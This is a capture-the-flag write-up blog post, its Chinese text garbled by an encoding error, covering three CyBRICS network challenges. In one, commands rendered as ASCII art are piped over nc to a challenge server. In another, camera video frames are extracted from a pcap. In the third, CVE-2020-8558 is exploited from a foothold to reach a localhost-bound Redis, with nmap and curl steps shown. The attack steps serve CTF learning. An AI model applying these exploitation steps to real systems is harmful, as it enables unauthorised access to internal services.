&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729143946243.png" alt="image-20210729143946243">&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://www.runoob.com/html/html5-websocket.html">HTML5 WebSocket&lt;/a> | &lt;a href="https://wiki.wgpsec.org/knowledge/web/websocket-sec.html">WebSocketÂÆâÂÖ®ÈóÆÈ¢òÂàÜÊûê&lt;/a> &lt;a href="https://segmentfault.com/a/1190000014582485">WebSocketÊñ≠ÂºÄÂéüÂõ†ÂàÜÊûê&lt;/a> | &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Request/mode">Request.mode&lt;/a> &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch">‰ΩøÁî® Fetch&lt;/a> | &lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WindowOrWorkerGlobalScope/fetch">WorkerOrGlobalScope.fetch()&lt;/a> | &lt;a href="https://www.freebuf.com/news/193447.html">Burpsuite CollaboratorÊ®°ÂùóËØ¶Ëß£&lt;/a> | &lt;a href="https://blog.fabiopires.pt/running-your-instance-of-burp-collaborator-server/">Running Your Instance of Burp Collaborator Server&lt;/a>ÔºàÂàóÂÖ•ÂæÖÂÆåÊàêËÆ°Âàí&lt;/p>
&lt;h2 id="ascii-terminal-network-baby-116-pts">ASCII Terminal (Network, Baby, 116 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Artur Khanov (&lt;a href="https://t.me/awengar">@awengar&lt;/a>)&lt;/p>
&lt;p>At &lt;code>138.68.83.253:3333&lt;/code> you have an ASCII terminal. It really works, check with the &lt;a href="https://cybrics.net/files/id.txt">&lt;strong>id command&lt;/strong>&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ncËøû‰∏ä‰ª•ÂêéÂèØ‰ª•ÁúãÂà∞‰∏Ä‰∏™bash $ÔºåÈ¢òÁõÆÁöÑÊèêÁ§∫ÊòØ&amp;quot;ASCII termial&amp;quot;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728231402633.png" alt="image-20210728231402633">&lt;/p>
&lt;p>ÊääË¶ÅÊâßË°åÁöÑÂëΩ‰ª§‰πüË°®Á§∫ÊàêËøôÁßçÂΩ¢ÂºèÂêéÂèëÈÄÅÂç≥ÂèØÔºåËøôÈáå‰ΩøÁî®ÁöÑÊòØlinux‰∏ãÁöÑtoiletÂ∑•ÂÖ∑&lt;/p>
&lt;p>toiletÂèØ‰ª•ÊääÂ≠óÊØçÊãºÊàêÁî®Â≠óÁ¨¶ÊàñÂÖ∂‰ªñÊñπÂºèË°®Á§∫ÁöÑÊõ¥Â§ßÁöÑÂ≠óÊØçÔºåÂèØ‰ª•Â∏¶‰∏Ä‰∫õÂèÇÊï∞Êù•ÊéßÂà∂Â≠ó‰Ωì Â≠óÂè∑‰ª•ÂèäÊ†∑Âºè ÊØîÂ¶Ç&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234413850.png" alt="image-20210728234413850">&lt;/p>
&lt;p>ÂèØ‰ª•Áé©Âá∫ÂæàÂ§öËä±Ê†∑~&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210728234351668.png" alt="image-20210728234351668">&lt;/p>
&lt;p>‰π¶ÂΩíÊ≠£È¢òÔºåËøôÈáå‰ΩøÁî®&lt;code>toilet -f bigascii9 +command&lt;/code>ÁöÑÂëΩ‰ª§ÁîüÊàêÁªìÊûúÔºåÂ∞ÜÁ©∫Ê†ºÊç¢‰∏∫ &lt;code>.&lt;/code>ÂÜçÂèëÈÄÅÂç≥ÂèØ&lt;/p>
&lt;pre tabindex="0">&lt;code>toilet -f bigascii9 ls &amp;gt; ls.txt
cat ls.txt | nc 138.68.83.253 3333 &amp;gt; ls_result.txt
toilet -f bigascii9 'cat flag.txt' &amp;gt; cat.txt
cat cat.txt | nc 138.68.83.253 2333 &amp;gt; flag.txt
&lt;/code>&lt;/pre>&lt;p>ÔºàÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØ Â¶ÇÊûúÁõ¥Êé•‰ΩøÁî®‰∏äÈù¢ÁöÑÂëΩ‰ª§ÁîüÊàêÁõ∏Â∫îÊñá‰ª∂ÂêéÁî®vimÁºñËæëÂô®ÁöÑ&lt;code>%s/\s/./g&lt;/code>ÂëΩ‰ª§Êù•ËøõË°åÁ©∫Ê†ºÁöÑÊõøÊç¢Ôºå‰ºöÂá∫Áé∞‰∏ãÈù¢ËøôÊ†∑ÁöÑÊÉÖÂÜµ È¶ñÈÉ®ÂíåÂ∞æÈÉ®ÈÉΩÈúÄË¶ÅÊâãÂä®‰øÆÊ≠£‰∏Ä‰∏ã&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729002105318.png" alt="image-20210729002105318">&lt;/p>
&lt;p>ÊúÄÂêéflagÔºöcybrics{T3553R4C7_15_GOOD}&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîpsÔºöÂú®ËµõÂêéÁöÑÂÆòÊñπyoutubeÁõ¥Êí≠ËÆ≤Ëß£‰∏≠Â±ïÁ§∫‰∫ÜËøô‰∏™ascii terminalÁöÑÊ∫êÁ†ÅÔºåÊòØ‰ΩøÁî®pythonÁºñÂÜôÁöÑ ÂØπËøô‰∏™terminalÁöÑËøêË°åÊÑüÂÖ¥Ë∂£ÁöÑÂèØ‰ª•Âà∞&lt;a href="https://www.youtube.com/watch?v=SFnj6DRTIzE&amp;amp;t=2605s">ÂΩïÊí≠ËßÜÈ¢ë&lt;/a>‰∏≠Áúã&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://www.shuzhiduo.com/A/RnJW9QLBdq/">Ë∞ÉÁöÆÊç£ËõãÁöÑLinux‰∏ãÊúâË∂£ÁªàÁ´ØÁöÑÂêàÈõÜ&lt;/a> | &lt;a href="https://www.howtoing.com/create-ascii-text-banners-in-linux-terminal">Linux Fun - Â¶Ç‰ΩïÂú®ÁªàÁ´Ø‰∏≠ÂàõÂª∫ASCIIÊñáÊú¨Ê®™ÂπÖ&lt;/a> | &lt;a href="https://www.howtoing.com/neofetch-shows-linux-system-information-with-logo/">Neofetch - ÊòæÁ§∫ÂÖ∑ÊúâÂàÜÂèëÊ†áÂøóÁöÑLinuxÁ≥ªÁªü‰ø°ÊÅØ&lt;/a>&lt;/p>
&lt;h2 id="lx-100-network-easy-192-pts">LX-100 (Network, Easy, 192 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>We were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.&lt;/p>
&lt;p>Anyway, we were discussing CyBRICS flags there, hope there‚Äôs no way to leak them.&lt;/p>
&lt;p>&lt;a href="https://cybrics.net/files/lx100.pcap">&lt;strong>lx100.pcap&lt;/strong>&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ÔºàËØ¥ÂÆûËØùÔºåpacpÂåÖÊòØÁúüÁöÑ‰∏ç‰ºöÁúãTAT&lt;/p>
&lt;p>È¶ñÂÖàÁúãÂà∞ÊúâHTTPÁöÑÊµÅÈáèÔºåËÆøÈóÆÁöÑÊòØhttp://192.168.54.1/cam.cgi?mode=getstateÔºåËøôÊòØLumix GX80ÊëÑÂÉèÂ§¥ÔºåËßÜÈ¢ëÊµÅÈÄöËøáUDP‰º†ËæìÔºõËøΩË∏™UDPÊµÅÈáèÔºåÂØºÂá∫ÊµÅÈáè Âπ∂ÊâπÈáèÊèêÂèñÂá∫ÂÖ∂‰∏≠ÁöÑjpgÊñá‰ª∂
Ôºà‰ª•‰∏ãÊòØÂÆòÊñπÁªôÂá∫ÁöÑËß£ ‰ΩøÁî®‰∫ÜtsharkÂ∑•ÂÖ∑ÔºàÂç≥ÂëΩ‰ª§Ë°åÁâàÁöÑwireshrkÔºà‰ΩÜÊòØËøôÁßçÊñπÊ≥ïÊú¨Âú∞Â§çÁé∞Â§±Ë¥• ÂØºÂá∫ÁöÑjpgÊó†Ê≥ïÊ≠£Â∏∏Ëß£Êûê ‰ΩÜÊòØ&lt;a href="https://www.youtube.com/watch?v=Sf_0f8PWNuI&amp;amp;t=80s">ÂÆòÊñπËßÜÈ¢ë‰∏≠&lt;/a>Á°ÆÂÆûËøôÊ†∑ÂèØ‰ª•ÊàêÂäü emmmm&lt;/p>
&lt;pre tabindex="0">&lt;code>tshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data &amp;gt; hex.txt
php -a
foreach(file(&amp;quot;hex.txt&amp;quot;)as $i =&amp;gt; $ln) {file_put_contents(&amp;quot;frame$i.jpg&amp;quot;,hex2bin(trim($ln)));}
&lt;/code>&lt;/pre>&lt;p>Ôºà‰ª•‰∏ãÊòØÂú®&lt;a href="https://scavengersecurity.com/posts/cybrics-lx100/">Âà´ÁöÑwp&lt;/a>‰∏≠ÁúãÂà∞ÁöÑpyËÑöÊú¨Ôºö ÂèØÊàêÂäüÂ§çÁé∞ ÂØºÂá∫455Âº†jpgÂõæ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pyshark&lt;/span>
&lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pyshark&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FileCapture&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;lx100.pcap&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#34;UDP&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;udp&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">srcport&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">65415&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">count&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#111">udp_bytes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fromhex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">find&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ffd8ffdb&amp;#39;&lt;/span>&lt;span style="color:#111">):])&lt;/span>
&lt;span style="color:#111">file_out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;out_files/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">count&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;_packet.jpg&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;wb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">file_out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">udp_bytes&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/235_packet.jpg" alt="235_packet">&lt;/p>
&lt;p>&lt;del>ÊîæÂ§ß ÂÜçÊîæÂ§ß ÊØè‰∏ÄÊ†π&lt;/del> ÊúÄÂêéÁöÑflagÊòØ &lt;code>cybrics{Lost_Secrets_In_The_AIr}&lt;/code>&lt;/p>
&lt;h2 id="localhost-network-hard-267-pts">localhost (Network, Hard, 267 pts)&lt;/h2>
&lt;blockquote>
&lt;p>Author: Vlad Roskov (&lt;a href="https://t.me/mrvos">@mrvos&lt;/a>)&lt;/p>
&lt;p>Remember NET fleeks? I‚Äôve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.&lt;/p>
&lt;pre tabindex="0">&lt;code>ssh localhost@109.233.61.10
Password: ohx7eeQu
&lt;/code>&lt;/pre>&lt;p>Your team token &amp;gt; Sw0T5cecsfJfaKApOiKzsA&lt;/p>
&lt;/blockquote>
&lt;p>ÂÖàsshËøû‰∏äÁúãÁúãÊÉÖÂÜµÔºàÂõæ‰∏≠Êúâ‰∏ÄÂè•ÂëΩ‰ª§ËæìÈîô‰∫Ü Â∫îËØ•ÊòØroutes Áïô‰∏ã‰∫ÜËã±ËØ≠‰∏çÂ•ΩÁöÑÊ≥™Ê∞¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729122432345.png" alt="image-20210729122432345">&lt;/p>
&lt;p>Ëá™Â∏¶python2 python3 nmapÔºåÂπ∂‰∏îÊú¨Ë∫´Â∞±ÊòØrootË∫´‰ªΩÔºåÊâ´‰∏Ä‰∏ãÂÜÖÁΩëÁΩëÊÆµ&lt;code>nmap -sS -Pn 10.193.10.7/24&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131318834.png" alt="image-20210729131318834">&lt;/p>
&lt;p>ÂèëÁé∞10.193.10.180ÁöÑ80Á´ØÂè£ÂºÄÊîæÔºåÁî®curlËÆøÈóÆ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729131419115.png" alt="image-20210729131419115">&lt;/p>
&lt;p>ÊèêÁ§∫&lt;em>Flag-containing-Records&lt;/em> Êé•ÁùÄËÆøÈóÆ‰∏§‰∏™Ë∂ÖÈìæÊé•ÁöÑÂÜÖÂÆπ&lt;/p>
&lt;p>&lt;code>curl 10.193.10.180/redis.conf&lt;/code>ÊòØredisÁöÑÈÖçÁΩÆÊñá‰ª∂ÔºåÂá†‰πéÊâÄÊúâÁöÑÂÜÖÂÆπÈÉΩÊòØË¢´Ê≥®ÈáäÊéâÁöÑÁ§∫‰æãÂÜÖÂÆπÔºåÊúâÁî®ÁöÑÂ∞±ÂÜÖÂÆπÂπ∂‰∏çÂ§öÔºö&lt;/p>
&lt;pre tabindex="0">&lt;code>bind 127.0.0.1
protected-mod yes
port 6379
&lt;/code>&lt;/pre>&lt;p>&lt;code>curl 10.193.10.180/sysctl.conf&lt;/code>‰πüÊòØÁõ∏ÂÖ≥ÁöÑÈÖçÁΩÆÊñá‰ª∂ Âè™Êúâ‰∏ÄÂè•Ê≤°Ë¢´Ê≥®Èáä&lt;/p>
&lt;pre tabindex="0">&lt;code>net.ipv4.conf.all.route_localnet=1
&lt;/code>&lt;/pre>&lt;p>Êü•googleÔºåÂèëÁé∞‰∫ÜËøô‰∫õÔºö&lt;a href="https://github.com/kubernetes/kubernetes/issues/90259">net.ipv4.conf.all.route_localnet=1 opens security issue #90259&lt;/a> | &lt;a href="https://github.com/tabbysable/POC-2020-8558">POC-2020-8558&lt;/a>&lt;/p>
&lt;p>ÊòØ‰∏Ä‰∏™ÂéªÂπ¥ÁàÜÂá∫ÁöÑcveÔºåÂÖ∑‰ΩìÁöÑÂÜÖÂÆπ ÊàêÂõ†‰ª•ÂèäËÉåÊôØÁü•ËØÜ‰∏çÂ§öËµòËø∞ ‰∏äÈù¢ÁöÑÈìæÊé•‰∏≠ÂÜôÁöÑÂæàËØ¶ÁªÜÔºåËøôÈáåÊëòÂèñÂá†ÊÆµÔºö&lt;/p>
&lt;blockquote>
&lt;p>In order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code> sysctl setting. According to the kernel documentation, this setting makes the kernel &amp;ldquo;not consider loopback addresses as martian&amp;rdquo; &amp;ndash; a consequence of which is that they could be accessed by other nodes on the network. That&amp;rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!&lt;/p>
&lt;p>&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>A normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code> changes that &amp;ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.&lt;/p>
&lt;p>So, if an attacker has a local connection to a target node with &lt;code>net.ipv4.conf.all.route_localnet=1&lt;/code>, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.&lt;/p>
&lt;p>Note that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker&amp;rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.&lt;/p>
&lt;/blockquote>
&lt;p>Ôºà‰∏çÂæó‰∏çËØ¥ipv4ÂΩìÂàùÊääÊï¥‰∏™&lt;code>127.0.0.0/8&lt;/code>ÁöÑÂú∞ÂùÄÈÉΩÁªô‰∫ÜÊú¨Âú∞ÂõûÁéØÁî®ÁúüÁöÑÊòØÂ§™ÊÖ∑ÊÖ®‰∫Ü&amp;hellip;&amp;hellip; Âà∞ipv6Â∞±Âè™Êúâ‰∏Ä‰∏™&lt;code>:: 1&lt;/code>&lt;/p>
&lt;p>Âú®ËøôÈáåÁõ¥Êé•Áî®pocÊâìÂç≥ÂèØÔºåÂÖ≥‰∫étest.pyÂíåpoc.pyËøôÈáå‰πüÊëòÂèñ‰∏Ä‰∏ãËØ¥Êòé&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>tst-2020-8558.py&lt;/strong>
Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to &lt;code>127.0.0.1&lt;/code> via your target, and looks to see if there is a reply.&lt;/p>
&lt;p>&lt;strong>poc-2020-8558.py&lt;/strong>
Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default).
Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal.
Because this script uses raw sockets to send and receive the &amp;ldquo;localhost&amp;rdquo; packets, it works fine inside a normal unprivileged container.&lt;/p>
&lt;/blockquote>
&lt;p>Âõ†‰∏∫ÈúÄË¶Ånc ÊâÄ‰ª•Âè¶ÂºÄ‰∏Ä‰∏™shell&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153443403.png" alt="image-20210729153443403">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210729153501930.png" alt="image-20210729153501930">&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://jan.show/?p=128">wp&lt;/a> | &lt;a href="https://www.zhihu.com/question/49866806">‰∏∫‰ªÄ‰πàÊï¥‰∏™127.*ÁΩëÊÆµÈÉΩË¢´ÊãøÊù•ÂΩìÂÅöÁéØÂõûÂú∞ÂùÄ‰∫ÜÔºü&lt;/a>&lt;/p>
&lt;hr>
&lt;p>Êú¨‰∫∫ÊØîËæÉËèúÔºåÂè™ÂÅöÂá∫Êù•‰∫ÜÁ≠æÂà∞È¢òÂíåÂá†‰∏™webÔºåÂÖ∂‰ΩôÂùá‰∏∫ËµõÂêéÂ§çÁõòÔºå&lt;a href="https://mp.weixin.qq.com/s/SQ-DGvug-P6PK-s3qkJVdw">Ê≠§Â§ÑÊòØÂèÇËÄÉwp&lt;/a>&lt;/p>
&lt;p>ÈÅìÈòª‰∏îÈïøÂëÄÔºåÊöëÂÅáË¶ÅÂ•ΩÂ•ΩÂä™ÂäõÂíØ („Å§–¥‚äÇ)
ÂèÇÁÖß‰∏Ä‰∫õÊïôÁ®ãÊääÁÆÄÂçïÁöÑÂçöÂÆ¢‰πüÊê≠Ëµ∑Êù•‰∫ÜÔºå‰ª•ÂêéË¶ÅÊääËøô‰∏™Â∞èÁ™ùÊÖ¢ÊÖ¢‰∏∞ÂØåËµ∑Êù•(„Çù‚àÄÔΩ•)‚òÜ&lt;/p></description></item></channel></rss>